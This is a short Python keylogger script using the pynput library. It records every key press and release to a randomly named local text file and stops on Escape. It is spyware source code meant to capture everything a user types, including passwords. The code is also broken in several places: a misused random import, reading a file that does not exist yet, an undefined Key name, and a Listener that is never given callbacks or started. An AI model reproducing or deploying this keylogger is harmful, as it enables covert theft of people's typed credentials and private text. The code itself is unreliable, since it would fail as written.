from random import random

from pynput.keyboard import Listener

file_name= 'keylogg{0}.txt'.format(str(random.randint(0, 100000)))
with open(file_name) as file :
    file.close()

def on_press (key) :
    with open(file_name,'a') as file :
        file.write('{0} pressed\n'.format(key))
        file.close()

def on_release (key) :
    with open(file_name,'a') as file :
        file.write('{0} released\n'.format(key))
        file.close()
    if key == Key.esc :
        return False

Listener()